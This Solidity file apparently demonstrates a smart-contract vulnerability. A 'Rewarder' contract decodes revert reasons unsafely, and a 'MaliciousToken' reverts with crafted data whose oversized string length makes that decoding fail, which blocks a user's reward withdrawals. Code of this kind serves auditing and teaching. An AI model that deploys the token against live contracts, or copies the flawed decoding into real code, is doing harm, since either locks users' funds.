// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract Rewarder {
    event RewardTransferFailed(string);

    struct Reward {
        IERC20 token;
        uint256 rewardAmount;
    }
    mapping(address => Reward[]) public rewards;

    function giveReward(address _user , IERC20 _token , uint _amount ) external {
        rewards[_user].push(Reward({token: _token , rewardAmount : _amount} ));
        IERC20(_token).transferFrom(msg.sender , address(this) , _amount);
    }

    function withdrawRewards() external {
        Reward[] memory userRewards = rewards[msg.sender];
        uint256 rewardLenght = userRewards.length;
        IERC20 token ;
        uint amount ;

         for (uint i; i<rewardLenght;) {
            token=userRewards[i].token;
            amount=userRewards[i].rewardAmount;

            try token.transfer(msg.sender , amount) {
                delete rewards[msg.sender][i];
            } catch (bytes memory reoson ) {
                string memory revertReoson = getRevertMessage(reoson);
                emit RewardTransferFailed(revertReoson);
            }

            unchecked {
                ++i;
            }


         }
    }

    function getRevertMessage(bytes memory data) internal view returns(string memory ) {
        if(data.length < 68 ) {
            return "";
        }

        bytes4 errorSelector;
        assembly {
            errorSelector := mload(add(data , 0x20))
        }
        
        if (errorSelector == bytes4(0x08c379a0)) {
            assembly {
                data := add(data , 0x04)
            }

            return abi.decode(data , (string));
        }

        return "";
    }
}

contract MaliciousToken is ERC20 {
    constructor() ERC20 ("BAD" , "TOKEN") {
        _mint(msg.sender, 100);
    }

    function transfer(address to, uint256 value) public override  returns (bool)  {
        assembly {
            let free_memory := mload(0x40)
            mstore(free_memory , 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(free_memory , 4) , 0x20)
            mstore(add(free_memory , 36) , 0xfffffffffffffffffffffffffffffff )
            revert(free_memory , 100)
        }
    }

}

contract GoodToken is ERC20 {
    constructor() ERC20("GOOD" , "TOKEN") {
        _mint(msg.sender, 100);
    }
}